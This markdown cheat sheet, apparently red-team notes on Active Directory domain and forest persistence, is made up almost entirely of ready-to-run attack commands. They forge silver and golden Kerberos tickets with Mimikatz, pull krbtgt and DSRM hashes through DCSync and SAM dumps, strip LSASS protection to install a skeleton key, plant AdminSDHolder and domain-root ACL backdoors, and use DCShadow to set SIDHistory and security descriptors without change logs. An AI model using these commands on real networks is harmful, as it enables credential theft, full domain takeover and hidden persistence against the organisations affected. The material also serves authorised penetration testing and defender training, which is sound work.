# Domain Persistence

## Silver Ticket
|Tool|Command|Description|
|---|---|---|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"kerberos::golden /User:\$Username /domain:\$DomainName /sid:\$DomainSID /target:\$ComputerName /service:\$Service /rc4:\$NTLMHash /id:\$UserID /groups:512 /ptt"'|Create service ticket for user \$Username to access \$Service on \$ComputerName (See constrained delegation)|

### Alternate Services
|ServiceName|Command|Description|
|---|---|---|
|HOST|Invoke-Mimikatz -Command '"kerberos::golden /domain:\$DomainName /sid:\$DomainSID /target:\$ComputerName /service:HOST /rc4:\$MachineHash /user:\$Username /ptt"'|Host service allows for scheduled task creation|
|RPCSS|Invoke-Mimikatz -Command '"kerberos::golden /domain:\$DomainName /sid:\$DomainSID /target:\$ComputerName /service:RPCSS /rc4:\$MachineHash /user:\$Username /ptt"'|RPC|
|WSMAN|Invoke-Mimikatz -Command '"kerberos::golden /domain:\$DomainName /sid:\$DomainSID /target:\$ComputerName /service:WSMAN /rc4:\$MachineHash /user:\$Username /ptt"'|WinRM|
|CIFS|Invoke-Mimikatz -Command '"kerberos::golden /domain:\$DomainName /sid:\$DomainSID /target:\$ComputerName /service:CIFS /rc4:\$MachineHash /user:\$Username /ptt"'|File System Access|

## Golden Ticket

|Tool|Command|Description|
|---|---|---|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"kerberos::golden /User:\$Username /domain:\$DomainName /sid:\$DomainSID /krbtgt:\$krbtgtNTLMHash /id:\$UserRid /groups\$512 /startoffset:0 /endin:600 /renewmax::100800 /ptt"'|Create TGT for \$Username on \$DomainName and pass ticket into current PowerShell process|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"kerberos::golden /User:\$Username /domain:\$DomainName /sid:\$DomainSID /krbtgt:\$krbtgtNTLMHash /id:\$UserRid /groups\$512 /startoffset:0 /endin:600 /renewmax::100800 /ticket"'| Create TGT for \$Username on \$DomainName and save ticket to file|

## DCSync
- Needs DA Privileges, does not need code execution on the DC
|Tool|Command|Description|
|---|---|---|
|Invoke-Mimikatz|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:\$DomainName /user:krbtgt"'|Use DCSync feature and get krbtgt hash|

## Skeleton Key
- Persistence technique where it is possible to patch a DC to allow access as any user with a single password
- Publicly known methods are not persistent across reboot(s)
- Requires DA privileges
- In case lsass is running as a protected process, you need the mimikatz driver (mimidriv.sys) on disk of the target DC
```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```

### Addt'l Notes
- Very noisy
- Involves service installation and a kernel mode driver and files on disk
- Do not use outside of lab environments, you shouldn't ever need to use this technique

## Directory Services Restore Mode (DSRM)
|Command|Description|
|---|---|
|Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName \$ComputerName|Dump DSRM password (requires DA privs)|
|Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName \$ComputerName|Compare Administrator hash with the Administrator hash of this command, first one is DSRM local admin|
|Invoke-Mimikatz -Command '"sekurlsa::pth /domain:\$DomainName /user:\$Username /ntlm:\$NTLMHash /run:powershell.exe"'|Pass Administrator Hash|

### Addt'l Notes:
- Since it is the local admin of the DC, we can pass the hash to authenticate
- Need to change the logon behavior of the DSRM account before using the hash:
```
Enter-PSSession -ComputerName \$ComputerName New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

## ACLs

### AdminSDHolder
- Resides in the System container of a domain, used to control the permissions for certain built-in privileged groups (Protected Groups)
- Controls all permissions for:
    - Account Operators - Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
    - Backup Operators - Backup GPO, edit to add SID of controlled account to a privileged group, restore.
    - Server Operators - Run a command as system (using the disabled Browser service)
    - Print Operators - Copy ntds.dit backup, load device drivers
    - Domain Admins
    - Replicator
    - Enterprise Admins
    - Domain Controllers
    - Read-Only Domain Controllers
    - Schema Admins
    - Administrators
- SDPROP (Security Descriptor Propogator) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL

#### Active Directory Module
|Command|Description|
|---|---|
|Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=\$Domain,DC=\$Domain' -Principal \$samAccountName -Verbose|Add FullControl permissions for \$samAccountName using Set-ADACL as DA|
|Add-ADGroupMember -Identity '\$GroupName' -Members \$Username|Abusing FullControl and adding a user to \$GroupName|

#### PowerView
|Command|Description|
|---|---|
|Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName \$samAccountName -Rights All -Verbose|Add FullControl permissions for \$samAccountName using PowerView as DA|
|Add-DomainGroupMember -Identity \$GroupName -Members \$Username -Verbose|Abusing FullControl and adding user to \$GroupName|

#### Retrieving Base ACE to AdminSDHolder
```
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=thing,DC=local")).psbase.ObjectSecurity.sddl
```

#### Triggering SDPROP via PowerView
|Command|Description|
|---|---|
|Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose||
|Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose|For pre-2008|

### ResetPassword permission

#### Active Directory Module
|Command|Description|
|---|---|
|Set-ADAccountPassword -Identity \$Username -NewPassword (ConvertTo-SecureString "\$Password" -AsPlainText -Force) -Verbose|Set \$Username's password|

#### PowerView
|Command|Description|
|---|---|
|Set-DomainUserPassword -Identity \$Username -AccountPassword (ConvertTo-SecureString "\$Password" -AsPlainText -Force) -Verbose|Set \$Username's password|

### Domain Root
- With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl and/or the ability to run DCSync
- Logging on this object enabled by default

#### Active Directory Module

|Command|Description|
|---|---|
|Set-ADACL -DistinguishedName 'DC=\$Domain,DC=\$Domain' -Principal \$Username -Verbose|Add FullControl rights to the Domain Root Object|
|Set-ADACL -DistinguishedName 'DC=\$Domain,DC=\$Domain' -Principal \$Username -GUIDRight DCSync -Verbose|Add DCSync Rights to User|

#### PowerView

|Command|Description|
|---|---|
|Add-ObjectAcl -TargetDistinguishedName 'DC=\$Domain,DC=\$Domain' -PrincipalSamAccountName \$Username -Rights All -Verbose|Add FullControl rights to Domain Root Object|
|Add-ObjectAcl -TargetDistringuishedName 'DC=\$Domain,DC=\$Domain' -PrincipalSamAccountName \$Username -Rights DCSync -Verbose|Add DCSync Rights to user|

## Security Descriptors
- It is possible to modify Security Descriptors of remote access methods to allow access to non-admin users
- Requires administrative privileges
- Security Descriptor Definition Language (SDDL) defines the format used to describe a Security Descriptor (SD)
    - Uses ACE strings for DACL and SACL
    - ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
- ACE for built-in administrators for WMI namespaces:
    - A;CI;CCDCLCSWRPWPRCWD;;;\$SID

### WMI
- Authentication
    - Must have privileges to connect to DCOM endpoint
    - Must have privileges to connect to namespace
- ACLs can be modified to allow non-admin users access to securable objects

References Set-RemoteWMI.ps1 and Set-RemotePSRemoting.ps1



# Forest Persistence

## DCShadow
- Temporarily registers a new domain controller in the target domain and uses it to "push" attributes like SIDHistory, SPNs, etc. on specified objects without leaving the changelogs for modified object(s)
- New domain controller is registered by modifying the Configuration Container, and SPNs of an existing computer object and some RPC services
- Because the attributes are changed from a "domain controller", there are no directory change logs on the actual DC for the target object
- DA privileges required (in most scenarios)
- Attacker machine must be part of the root domain
- When you make a machine a Domain Controller, a 4742 log will be left on the real domain controller(s)
- 2 Mimikatz Instances are required
    - One to start RPC servers with SYSTEM privileges and specify attributes to be modified
    - One with enough privileges to push the values

### First window:
```
!+
!processtoken
lsadump::dcshadow /object:$Object /attribute:$Attribute /value="$Value"
```

|Command|Description|
|---|---|
|lsadump::dcshadow /object:\$Username /attribute:SIDHistory /value:\$EnterpriseAdminSID|Set SID of \$Username to Enterprise Admin group|
|lsadump::dcshadow /object:\$Username /attribute:primaryGroupID /value:519|Set primaryGroupID to 519 (Enterprise Admin)|
|lsadump::dcshadow /object:\$ldappathtoAdminSDHolder /attribute:ntSecurityDescriptor /value:\$ModifiedACL|Append Full Control ACE for SY/BA/DA with our user's SID at the end|

### Second window:
```
lsadump::dcshadow /push
```

## Minimalist DCShadow

### Required Permissions:
- Domain Object:
    - DS-Install-Replica (Add/Remove Replica in Domain)
    - DS-Replication-Manage-Topology (Manage Replication Topology)
    - DS-Replication-Synchronize (Replication Synchronization)
- Sites Object
    - CreateChild
    - DeleteChild
- Object of the computer registered as a DC:
    - WriteProperty (Not Write)
- Target Object:
    - WriteProperty (Not Write)

Reference Set-DCShadowPermissions by Nishang

## ShadowCeption
- Running DCShadow from within DCShadow

Getting Base ACE to the Domain Object:

```
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=thing,DC=local")).psbase.ObjectSecurity.sddl
```

Append ACEs to the Domain Object:

```
lsadump::dcshadow /stack /object:DC=thing,DC=local /attribute:ntSecurityDescriptor /value:\\$OriginalACL(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;\\$UserSID)(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;\\$UserSID)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;\\$UserSID)
```

Append to the attacker computer object:

```
lsadump::dcshadow /stack /object:CN=\\$ComputerName,CN=Computers,DC=thing,DC=local /attribute:ntSecurityDescriptor /value:\\$OriginalACL(A;;WP;;;\\$UserSID)
```

Append to the User object:

```
lsadump::dcshadow /stack /object:\\$Username /attribute:ntSecurityDescriptor /value:\\$OriginalACL(A;;WP;;;\\$UserSID)
```

Append to the Site object:

```
lsadump::dcshadow /stack /object:\\$Username /attribute:ntSecurityDescriptor /value:\\$OriginalACL(A;CI;CCDC;;;\\$UserSID)
```
